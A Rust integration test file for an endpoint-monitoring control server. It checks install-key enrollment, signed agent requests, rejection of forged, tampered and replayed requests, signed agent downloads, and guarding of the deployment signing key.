use axum::{
    body::Body,
    http::{Request, StatusCode},
};
use ed25519_dalek::{Signer, SigningKey, Verifier};
use sha2::Digest;
use sqlx::sqlite::{SqlitePool, SqlitePoolOptions};
use tower::ServiceExt;

async fn create_test_db() -> SqlitePool {
    let pool = SqlitePoolOptions::new()
        .max_connections(5)
        .connect("sqlite::memory:")
        .await
        .expect("Failed to connect to test database");

    sqlx::migrate!("./migrations")
        .run(&pool)
        .await
        .expect("Failed to run migrations");

    seed_test_accounts(&pool).await;
    pool
}

async fn seed_test_accounts(pool: &SqlitePool) {
    for (id, username, role) in [("user-1", "tester", "admin"), ("user-2", "reader", "user")] {
        sqlx::query("INSERT INTO users (id, username, password_hash, role, created_at) VALUES (?, ?, 'no-password', ?, 0)")
            .bind(id)
            .bind(username)
            .bind(role)
            .execute(pool)
            .await
            .expect("Failed to seed test accounts");
    }
}

const TEST_JWT_SECRET: &str = "test-secret-key-for-testing-purposes-only";
const TEST_SIGNING_KEY_HEX: &str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";

const TEST_SERVER_URL: &str = "https://localhost:8443";
const AGENT_CODE_BEFORE_KEY_SLOT: &[u8] = b"_agent_code_";

fn agent_template(with_key_slot: bool) -> Vec<u8> {
    let mut template = b"MZ_agent_".to_vec();
    template.extend_from_slice(zedr_control_server::signing::SERVER_URL_PLACEHOLDER);
    template.extend_from_slice(AGENT_CODE_BEFORE_KEY_SLOT);
    if with_key_slot {
        template.extend_from_slice(&zedr_protocol::SIGNING_PUBLIC_KEY_PLACEHOLDER);
    }
    template.extend_from_slice(b"_agent_tail");
    template
}

fn test_binaries_dir() -> &'static std::path::Path {
    static DIR: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
    DIR.get_or_init(|| {
        let dir = std::path::Path::new(env!("CARGO_TARGET_TMPDIR")).join("agent-binaries");
        let current = dir.join("v0.1.0/windows/arm64");
        let predates_key_slot = dir.join("v0.1.0/windows/x64");
        let linux = dir.join("v0.1.0/linux/x64");
        std::fs::create_dir_all(&current).unwrap();
        std::fs::create_dir_all(&predates_key_slot).unwrap();
        std::fs::create_dir_all(&linux).unwrap();
        std::fs::write(current.join("zedr-agent.exe"), agent_template(true)).unwrap();
        std::fs::write(linux.join("zedr-agent"), agent_template(true)).unwrap();
        std::fs::write(predates_key_slot.join("zedr-agent.exe"), agent_template(false)).unwrap();
        dir
    })
}

fn set_test_env() {
    std::env::set_var("JWT_SECRET", TEST_JWT_SECRET);
    std::env::set_var("ZEDR_SERVER_URL", TEST_SERVER_URL);
    std::env::set_var("ZEDR_SIGNING_KEY_HEX", TEST_SIGNING_KEY_HEX);
    std::env::set_var("ZEDR_BINARIES_DIR", test_binaries_dir());
}

async fn download_agent(app: &axum::Router, platform: &str, install_key: &str) -> (StatusCode, Vec<u8>) {
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .uri(format!("/api/installers/binaries/{}?key={}", platform, install_key))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    (status, bytes.to_vec())
}

async fn create_test_app() -> axum::Router {
    set_test_env();
    let pool = create_test_db().await;
    zedr_control_server::api::create_router(pool)
}

async fn create_test_app_with_pool() -> (axum::Router, SqlitePool) {
    set_test_env();
    let pool = create_test_db().await;
    (zedr_control_server::api::create_router(pool.clone()), pool)
}

struct TestAgent {
    id: String,
    key: SigningKey,
    session: u64,
    seq: u64,
}

impl TestAgent {
    fn new(id: &str) -> Self {
        Self {
            id: id.to_string(),
            key: SigningKey::generate(&mut rand::rngs::OsRng),
            session: 1,
            seq: 0,
        }
    }

    fn public_key(&self) -> String {
        hex::encode(self.key.verifying_key().to_bytes())
    }

    fn sign(&self, body: &str) -> String {
        hex::encode(self.key.sign(body.as_bytes()).to_bytes())
    }

    fn restart(&mut self) {
        self.session += 1;
        self.seq = 0;
    }

    fn registration(&mut self, enrollment_key: Option<&str>) -> String {
        self.seq += 1;
        let mut body = serde_json::json!({
            "agent_id": self.id,
            "hostname": "test-host",
            "platform": "windows",
            "os_version": "Windows 11",
            "architecture": "aarch64",
            "version": "0.1.0",
            "ip_address": "192.168.1.100",
            "public_key": self.public_key(),
            "session": self.session,
            "seq": self.seq,
        });
        if let Some(key) = enrollment_key {
            body["enrollment_key"] = serde_json::Value::String(key.to_string());
        }
        body.to_string()
    }

    fn batch(&mut self, events: serde_json::Value) -> String {
        self.seq += 1;
        serde_json::json!({
            "agent_id": self.id,
            "session": self.session,
            "seq": self.seq,
            "events": events,
        })
        .to_string()
    }

    fn heartbeat(&mut self) -> String {
        self.batch(serde_json::json!([{ "Heartbeat": { "timestamp": 1640995200 } }]))
    }
}

async fn post_agent(app: &axum::Router, uri: &str, body: String, signature: Option<&str>) -> (StatusCode, serde_json::Value) {
    let mut request = Request::builder()
        .method("POST")
        .uri(uri)
        .header("content-type", "application/json");
    if let Some(signature) = signature {
        request = request.header(zedr_protocol::SIGNATURE_HEADER, signature);
    }

    let response = app
        .clone()
        .oneshot(request.body(Body::from(body)).unwrap())
        .await
        .unwrap();

    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    let json = serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null);
    (status, json)
}

async fn send_signed(app: &axum::Router, agent: &TestAgent, uri: &str, body: String) -> (StatusCode, serde_json::Value) {
    let signature = agent.sign(&body);
    post_agent(app, uri, body, Some(&signature)).await
}

async fn insert_install_key(pool: &SqlitePool, plaintext: &str, expires_in_secs: i64) {
    let now = chrono::Utc::now().timestamp();
    sqlx::query(
        "INSERT INTO install_keys (id, key_hash, agent_version, expires_at, created_by, created_at)
         VALUES (?, ?, '0.1.0', ?, 'test-admin', ?)"
    )
    .bind(format!("id-{}", plaintext))
    .bind(hex::encode(sha2::Sha256::digest(plaintext.as_bytes())))
    .bind(now + expires_in_secs)
    .bind(now)
    .execute(pool)
    .await
    .unwrap();
}

async fn enroll(app: &axum::Router, pool: &SqlitePool, agent_id: &str) -> TestAgent {
    let mut agent = TestAgent::new(agent_id);
    let key = format!("zedr_key_for_{}", agent_id);
    insert_install_key(pool, &key, 3600).await;
    let body = agent.registration(Some(&key));
    let (status, _) = send_signed(app, &agent, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::OK, "enrollment of {} must succeed", agent_id);
    agent
}

async fn open_incidents(pool: &SqlitePool, agent_id: &str) -> Vec<String> {
    sqlx::query_scalar("SELECT incident_type FROM incidents WHERE agent_id = ? AND closed_at IS NULL ORDER BY incident_type")
        .bind(agent_id)
        .fetch_all(pool)
        .await
        .unwrap()
}

async fn liveness_state(pool: &SqlitePool, agent_id: &str) -> String {
    sqlx::query_scalar("SELECT liveness_state FROM agents WHERE id = ?")
        .bind(agent_id)
        .fetch_one(pool)
        .await
        .unwrap()
}

fn admin_token(role: &str) -> String {
    let (id, username) = if role == "admin" { ("user-1", "tester") } else { ("user-2", "reader") };
    zedr_control_server::auth::create_jwt(id, username, role, 0, TEST_JWT_SECRET).unwrap()
}

#[tokio::test]
async fn test_health_endpoint_returns_ok() {
    let app = create_test_app().await;

    let response = app
        .oneshot(
            Request::builder()
                .uri("/health")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(response.status(), StatusCode::OK);

    let body = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body).unwrap();

    assert_eq!(json["status"], "ok");
    assert_eq!(json["version"], env!("CARGO_PKG_VERSION"));
    assert_eq!(json["database"], "connected");
}

#[tokio::test]
async fn test_health_endpoint_verifies_database_connection() {
    let app = create_test_app().await;

    let response = app
        .oneshot(
            Request::builder()
                .uri("/health")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    let body = axum::body::to_bytes(response.into_body(), usize::MAX)
        .await
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&body).unwrap();
    
    assert_eq!(json["status"], "ok");
    assert_eq!(json["database"], "connected");
}

#[tokio::test]
async fn test_database_wal_mode() {
    // Skip WAL mode test for in-memory database used in tests
    // In-memory databases use 'delete' journal mode, not 'wal'
    let pool = create_test_db().await;
    
    let result: (String,) = sqlx::query_as("PRAGMA journal_mode")
        .fetch_one(&pool)
        .await
        .expect("Failed to check journal mode");
    
    // In-memory database uses 'memory' mode, which is expected for tests  
    assert!(result.0 == "delete" || result.0 == "wal" || result.0 == "memory", 
            "Database journal mode should be 'delete', 'wal' (production), or 'memory' (test): got '{}'", result.0);
}

#[tokio::test]
async fn test_database_schema_exists() {
    let pool = create_test_db().await;

    let agents_table: (i64,) = sqlx::query_as(
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='agents'"
    )
    .fetch_one(&pool)
    .await
    .expect("Failed to check agents table");

    assert_eq!(agents_table.0, 1, "agents table must exist");

    let events_table: (i64,) = sqlx::query_as(
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='events'"
    )
    .fetch_one(&pool)
    .await
    .expect("Failed to check events table");

    assert_eq!(events_table.0, 1, "events table must exist");
}

#[tokio::test]
async fn test_agent_registration() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_registration_key", 3600).await;

    let mut agent = TestAgent::new("test-machine-guid-123");
    let body = agent.registration(Some("zedr_registration_key"));
    let (status, json) = send_signed(&app, &agent, "/api/agents/register", body).await;

    assert_eq!(status, StatusCode::OK);
    assert_eq!(json["agent_id"], "test-machine-guid-123");
    assert!(json["registered_at"].is_number());

    let pinned: Option<String> = sqlx::query_scalar("SELECT public_key FROM agents WHERE id = ?")
        .bind("test-machine-guid-123")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(pinned, Some(agent.public_key()));
}

#[tokio::test]
async fn test_install_key_reuse_prevention() {
    set_test_env();

    let pool = create_test_db().await;
    
    // Create an install key
    let key_id = "test-key-123";
    let key_plaintext = "test-plaintext-key";
    let expires_at = chrono::Utc::now().timestamp() + 3600; // 1 hour from now
    let created_at = chrono::Utc::now().timestamp();
    let mut hasher = sha2::Sha256::new();
    hasher.update(key_plaintext.as_bytes());
    let key_hash = hex::encode(hasher.finalize());
    
    sqlx::query(
        "INSERT INTO install_keys (id, key_hash, agent_version, expires_at, created_by, created_at) 
         VALUES (?, ?, '0.1.0', ?, 'test-admin', ?)"
    )
    .bind(key_id)
    .bind(key_hash)
    .bind(expires_at)
    .bind(created_at)
    .execute(&pool)
    .await
    .unwrap();
    
    let app = zedr_control_server::api::create_router(pool.clone());
    
    // First download should work
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .uri(&format!("/api/installers/binaries/windows-arm64?key={}", key_plaintext))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    // Debug the response if it's not OK
    if response.status() != StatusCode::OK {
        let status = response.status();
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let body_text = String::from_utf8_lossy(&body);
        panic!("Expected 200 OK, got {}. Response body: {}", status, body_text);
    }
    assert_eq!(response.status(), StatusCode::OK);
    
    // Second download with same key should fail (reuse prevention)
    let response = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/installers/binaries/windows-arm64?key={}", key_plaintext))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_install_key_expiration() {
    set_test_env();
    let pool = create_test_db().await;
    
    // Create an expired install key
    let key_id = "expired-key-123";
    let key_plaintext = "expired-plaintext-key";
    let expires_at = chrono::Utc::now().timestamp() - 3600; // 1 hour ago
    let created_at = chrono::Utc::now().timestamp() - 7200; // 2 hours ago
    let mut hasher = sha2::Sha256::new();
    hasher.update(key_plaintext.as_bytes());
    let key_hash = hex::encode(hasher.finalize());
    
    sqlx::query(
        "INSERT INTO install_keys (id, key_hash, agent_version, expires_at, created_by, created_at) 
         VALUES (?, ?, '0.1.0', ?, 'test-admin', ?)"
    )
    .bind(key_id)
    .bind(key_hash)
    .bind(expires_at)
    .bind(created_at)
    .execute(&pool)
    .await
    .unwrap();
    
    let app = zedr_control_server::api::create_router(pool);
    
    let response = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/installers/binaries/windows-arm64?key={}", key_plaintext))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_install_key_revocation() {
    set_test_env();
    let pool = create_test_db().await;
    
    // Create a revoked install key
    let key_id = "revoked-key-123";
    let key_plaintext = "revoked-plaintext-key";
    let expires_at = chrono::Utc::now().timestamp() + 3600;
    let revoked_at = chrono::Utc::now().timestamp();
    
    sqlx::query(
        "INSERT INTO install_keys (id, key_hash, agent_version, expires_at, created_by, revoked_at, created_at) 
         VALUES (?, ?, '0.1.0', ?, 'test-admin', ?, ?)"
    )
    .bind(key_id)
    .bind(sha2::Sha256::digest(key_plaintext.as_bytes()).as_slice().iter().map(|b| format!("{:02x}", b)).collect::<String>())
    .bind(expires_at)
    .bind(revoked_at)
    .bind(chrono::Utc::now().timestamp())
    .execute(&pool)
    .await
    .unwrap();
    
    let app = zedr_control_server::api::create_router(pool);
    
    let response = app
        .oneshot(
            Request::builder()
                .uri(&format!("/api/installers/binaries/windows-arm64?key={}", key_plaintext))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_invalid_install_key_format() {
    let app = create_test_app().await;
    
    // Test with malformed key
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/installers/binaries/windows-arm64?key=invalid-key")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
    
    // Test with missing key
    let response = app
        .oneshot(
            Request::builder()
                .uri("/api/installers/binaries/windows-arm64")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    assert_eq!(response.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_unauthorized_access_blocked() {
    let app = create_test_app().await;
    
    // Test admin endpoints without auth
    let admin_endpoints = vec![
        "/api/admin/agents",
        "/api/admin/events",
        "/api/admin/installers",
    ];
    
    for endpoint in admin_endpoints {
        let response = app
            .clone()
            .oneshot(
                Request::builder()
                    .uri(endpoint)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        
        assert_eq!(
            response.status(), 
            StatusCode::UNAUTHORIZED,
            "Endpoint {} should require authentication", 
            endpoint
        );
    }
}

#[tokio::test]
async fn test_event_ingestion_accepts_valid_events() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "test-agent-id").await;

    let body = agent.batch(serde_json::json!([
        {
            "Process": {
                "timestamp": 1640995200,
                "pid": 1234,
                "ppid": 1000,
                "executable_path": "/usr/bin/test",
                "command_line": ["test", "--arg"],
                "action": "Create",
                "uid": 1000,
                "hash": null
            }
        },
        { "Heartbeat": { "timestamp": 1640995200 } }
    ]));
    let (status, json) = send_signed(&app, &agent, "/api/events", body).await;

    assert_eq!(status, StatusCode::OK);
    assert_eq!(json["upgrade"], serde_json::Value::Null);

    let stored: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'")
        .bind("test-agent-id")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(stored, 1);
}

#[tokio::test]
async fn test_binary_download_requires_valid_key() {
    let app = create_test_app().await;
    
    // Test download without any key
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/installers/binaries/linux-x64")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    // Expect 404 for missing route or 400 for missing required parameter
    assert!(response.status() == StatusCode::NOT_FOUND || response.status() == StatusCode::BAD_REQUEST, 
            "Expected 404 or 400, got {}", response.status());
    
    // Test download with invalid key
    let response = app
        .oneshot(
            Request::builder()
                .uri("/api/installers/binaries/linux-x64?key=nonexistent-key")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    
    // Expect 404 for missing route or 401/400 for invalid key
    assert!(response.status() == StatusCode::NOT_FOUND || 
            response.status() == StatusCode::UNAUTHORIZED ||
            response.status() == StatusCode::BAD_REQUEST, 
            "Expected 404, 401, or 400, got {}", response.status());
}

fn test_deployment_key() -> ed25519_dalek::VerifyingKey {
    let seed: [u8; 32] = hex::decode(TEST_SIGNING_KEY_HEX).unwrap().try_into().unwrap();
    SigningKey::from_bytes(&seed).verifying_key()
}

fn key_slot_of(download: &[u8]) -> [u8; 64] {
    let position = download
        .windows(AGENT_CODE_BEFORE_KEY_SLOT.len())
        .position(|window| window == AGENT_CODE_BEFORE_KEY_SLOT)
        .unwrap()
        + AGENT_CODE_BEFORE_KEY_SLOT.len();
    download[position..position + 64].try_into().unwrap()
}

#[tokio::test]
async fn test_downloaded_agent_carries_and_is_signed_by_the_deployment_key() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_download_key", 3600).await;

    let (status, download) = download_agent(&app, "windows-arm64", "zedr_download_key").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(download.len(), agent_template(true).len() + 64);

    let trusted = zedr_protocol::signing_public_key_from_slot(&key_slot_of(&download)).unwrap();
    assert_eq!(trusted, test_deployment_key().to_bytes());

    let url_slot = &download[b"MZ_agent_".len()..b"MZ_agent_".len() + 64];
    assert_eq!(&url_slot[..TEST_SERVER_URL.len()], TEST_SERVER_URL.as_bytes());
    assert!(url_slot[TEST_SERVER_URL.len()..].iter().all(|byte| *byte == 0));

    let (contents, signature) = download.split_at(download.len() - 64);
    let signature = ed25519_dalek::Signature::from_slice(signature).unwrap();
    let trusted = ed25519_dalek::VerifyingKey::from_bytes(&trusted).unwrap();
    assert!(trusted.verify(contents, &signature).is_ok());

    let mut tampered = contents.to_vec();
    tampered[0] ^= 0x01;
    assert!(trusted.verify(&tampered, &signature).is_err());
}

#[tokio::test]
async fn test_agent_built_without_key_slot_is_not_served() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_old_binary_key", 3600).await;

    let (status, download) = download_agent(&app, "windows-x64", "zedr_old_binary_key").await;
    assert_eq!(status, StatusCode::INTERNAL_SERVER_ERROR);
    assert!(!download.starts_with(b"MZ"));
}

const SIGNING_SEED_A: &str = "1111111111111111111111111111111111111111111111111111111111111111";
const SIGNING_SEED_B: &str = "2222222222222222222222222222222222222222222222222222222222222222";
const SIGNING_SEED_C: &str = "3333333333333333333333333333333333333333333333333333333333333333";

fn signing_service(seed_hex: &str) -> zedr_control_server::signing::SigningService {
    zedr_control_server::signing::SigningService::from_seed_hex(seed_hex).unwrap()
}

fn public_key_hex(seed_hex: &str) -> String {
    hex::encode(signing_service(seed_hex).public_key())
}

async fn start_with_signing_key(
    pool: &SqlitePool,
    seed_hex: &str,
    accepted: Option<&str>,
) -> Result<zedr_control_server::signing_key_guard::Outcome, zedr_control_server::error::AppError> {
    zedr_control_server::signing_key_guard::enforce(pool, &signing_service(seed_hex), accepted).await
}

async fn recorded_signing_key(pool: &SqlitePool) -> String {
    sqlx::query_scalar("SELECT public_key FROM deployment_signing_key WHERE id = 1")
        .fetch_one(pool)
        .await
        .unwrap()
}

#[tokio::test]
async fn test_first_start_records_the_signing_key_and_restarts_keep_it() {
    use zedr_control_server::signing_key_guard::Outcome;
    let (app, pool) = create_test_app_with_pool().await;

    assert_eq!(start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap(), Outcome::Recorded);
    assert_eq!(recorded_signing_key(&pool).await, public_key_hex(SIGNING_SEED_A));

    enroll(&app, &pool, "steady-agent").await;
    assert_eq!(start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap(), Outcome::Unchanged);
}

#[tokio::test]
async fn test_changed_signing_key_is_refused_while_agents_are_enrolled() {
    use zedr_control_server::signing_key_guard::{Outcome, ACCEPT_CHANGE_ENV};
    let (app, pool) = create_test_app_with_pool().await;

    start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap();
    enroll(&app, &pool, "stranded-agent").await;

    let err = start_with_signing_key(&pool, SIGNING_SEED_B, None).await.unwrap_err().to_string();
    assert!(err.contains("(1 enrolled)"), "{}", err);
    assert!(err.contains(&public_key_hex(SIGNING_SEED_A)), "{}", err);
    assert!(err.contains(&format!("{}={}", ACCEPT_CHANGE_ENV, public_key_hex(SIGNING_SEED_B))), "{}", err);

    assert_eq!(recorded_signing_key(&pool).await, public_key_hex(SIGNING_SEED_A));
    assert_eq!(start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap(), Outcome::Unchanged);
}

#[tokio::test]
async fn test_changed_signing_key_is_adopted_when_no_agent_is_enrolled() {
    use zedr_control_server::signing_key_guard::Outcome;
    let (_app, pool) = create_test_app_with_pool().await;

    start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap();
    assert_eq!(
        start_with_signing_key(&pool, SIGNING_SEED_B, None).await.unwrap(),
        Outcome::Changed { enrolled_agents: 0 }
    );
    assert_eq!(recorded_signing_key(&pool).await, public_key_hex(SIGNING_SEED_B));

    let audited: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM audit_log WHERE action = 'signing_key.changed'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(audited, 1);
}

#[tokio::test]
async fn test_accepting_a_changed_signing_key_must_name_the_new_key() {
    use zedr_control_server::signing_key_guard::Outcome;
    let (app, pool) = create_test_app_with_pool().await;
    let key_a = public_key_hex(SIGNING_SEED_A);
    let key_b = public_key_hex(SIGNING_SEED_B);

    start_with_signing_key(&pool, SIGNING_SEED_A, None).await.unwrap();
    enroll(&app, &pool, "reinstalled-agent").await;

    assert!(start_with_signing_key(&pool, SIGNING_SEED_B, Some(&key_a)).await.is_err());
    assert!(start_with_signing_key(&pool, SIGNING_SEED_B, Some("true")).await.is_err());
    assert_eq!(recorded_signing_key(&pool).await, key_a);

    assert_eq!(
        start_with_signing_key(&pool, SIGNING_SEED_B, Some(&key_b)).await.unwrap(),
        Outcome::Changed { enrolled_agents: 1 }
    );
    assert_eq!(recorded_signing_key(&pool).await, key_b);

    let detail: String = sqlx::query_scalar("SELECT detail FROM audit_log WHERE action = 'signing_key.changed'")
        .fetch_one(&pool)
        .await
        .unwrap();
    let detail: serde_json::Value = serde_json::from_str(&detail).unwrap();
    assert_eq!(detail["previous_public_key"], key_a.as_str());
    assert_eq!(detail["public_key"], key_b.as_str());
    assert_eq!(detail["enrolled_agents"], 1);
    assert!(zedr_control_server::audit::first_broken_entry(&pool).await.unwrap().is_none());

    assert_eq!(start_with_signing_key(&pool, SIGNING_SEED_B, Some(&key_b)).await.unwrap(), Outcome::Unchanged);
    assert!(start_with_signing_key(&pool, SIGNING_SEED_C, Some(&key_b)).await.is_err());
}

#[tokio::test]
async fn test_registration_without_signature_rejected() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_unsigned_key", 3600).await;

    let mut agent = TestAgent::new("unsigned-agent");
    let body = agent.registration(Some("zedr_unsigned_key"));
    let (status, _) = post_agent(&app, "/api/agents/register", body, None).await;

    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_registration_signed_by_other_key_rejected() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_forged_key", 3600).await;

    let mut agent = TestAgent::new("forged-agent");
    let impostor = TestAgent::new("forged-agent");
    let body = agent.registration(Some("zedr_forged_key"));
    let (status, _) = send_signed(&app, &impostor, "/api/agents/register", body).await;

    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_new_agent_without_enrollment_key_rejected() {
    let (app, pool) = create_test_app_with_pool().await;

    let mut agent = TestAgent::new("uninvited-agent");
    let body = agent.registration(None);
    let (status, _) = send_signed(&app, &agent, "/api/agents/register", body).await;

    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 0);
}

#[tokio::test]
async fn test_enrollment_key_enrolls_exactly_one_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_single_use", 3600).await;

    let mut first = TestAgent::new("first-agent");
    let body = first.registration(Some("zedr_single_use"));
    let (status, _) = send_signed(&app, &first, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::OK);

    let mut second = TestAgent::new("second-agent");
    let body = second.registration(Some("zedr_single_use"));
    let (status, _) = send_signed(&app, &second, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let rejected: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE event_type = 'enrollment_rejected'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(rejected, 1);

    let linked: String = sqlx::query_scalar("SELECT enrolled_agent_id FROM install_keys WHERE id = 'id-zedr_single_use'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(linked, "first-agent");
}

#[tokio::test]
async fn test_expired_and_revoked_keys_cannot_enroll() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_install_key(&pool, "zedr_expired", -10).await;
    insert_install_key(&pool, "zedr_revoked", 3600).await;
    sqlx::query("UPDATE install_keys SET revoked_at = 1 WHERE id = 'id-zedr_revoked'")
        .execute(&pool)
        .await
        .unwrap();

    for key in ["zedr_expired", "zedr_revoked", "zedr_never_issued"] {
        let mut agent = TestAgent::new(&format!("agent-{}", key));
        let body = agent.registration(Some(key));
        let (status, _) = send_signed(&app, &agent, "/api/agents/register", body).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "{} must not enroll", key);
    }
}

#[tokio::test]
async fn test_known_agent_reregisters_with_pinned_key_only() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "returning-agent").await;

    agent.restart();
    let body = agent.registration(None);
    let (status, _) = send_signed(&app, &agent, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn test_key_change_without_enrollment_opens_identity_conflict() {
    let (app, pool) = create_test_app_with_pool().await;
    let agent = enroll(&app, &pool, "contested-agent").await;

    let mut impostor = TestAgent::new("contested-agent");
    let body = impostor.registration(None);
    let (status, _) = send_signed(&app, &impostor, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    assert_eq!(open_incidents(&pool, "contested-agent").await, vec!["identity_conflict"]);
    let pinned: Option<String> = sqlx::query_scalar("SELECT public_key FROM agents WHERE id = 'contested-agent'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(pinned, Some(agent.public_key()));
}

#[tokio::test]
async fn test_reinstall_with_new_enrollment_key_rotates_identity() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut old_identity = enroll(&app, &pool, "reinstalled-agent").await;

    insert_install_key(&pool, "zedr_reinstall", 3600).await;
    let mut new_identity = TestAgent::new("reinstalled-agent");
    let body = new_identity.registration(Some("zedr_reinstall"));
    let (status, _) = send_signed(&app, &new_identity, "/api/agents/register", body).await;
    assert_eq!(status, StatusCode::OK);

    let body = new_identity.heartbeat();
    let (status, _) = send_signed(&app, &new_identity, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    let body = old_identity.heartbeat();
    let (status, _) = send_signed(&app, &old_identity, "/api/events", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let rotations: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM events WHERE agent_id = 'reinstalled-agent' AND event_type = 'identity_rotated'"
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert_eq!(rotations, 1, "a key rotation on an enrolled agent is recorded");
}

#[tokio::test]
async fn test_events_require_valid_signature_from_enrolled_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "signed-agent").await;

    let body = agent.heartbeat();
    let (status, _) = post_agent(&app, "/api/events", body, None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let impostor = TestAgent::new("signed-agent");
    let body = agent.heartbeat();
    let (status, _) = send_signed(&app, &impostor, "/api/events", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let mut stranger = TestAgent::new("never-enrolled");
    let body = stranger.heartbeat();
    let (status, _) = send_signed(&app, &stranger, "/api/events", body).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let body = agent.heartbeat();
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn test_tampered_body_rejected() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "tampered-agent").await;

    let body = agent.heartbeat();
    let signature = agent.sign(&body);
    let tampered = body.replace("1640995200", "1640995201");
    let (status, _) = post_agent(&app, "/api/events", tampered, Some(&signature)).await;

    assert_eq!(status, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_replayed_request_rejected_and_opens_incident() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "replayed-agent").await;

    let body = agent.heartbeat();
    let signature = agent.sign(&body);
    let (status, _) = post_agent(&app, "/api/events", body.clone(), Some(&signature)).await;
    assert_eq!(status, StatusCode::OK);

    let (status, _) = post_agent(&app, "/api/events", body, Some(&signature)).await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert_eq!(open_incidents(&pool, "replayed-agent").await, vec!["replay"]);
}

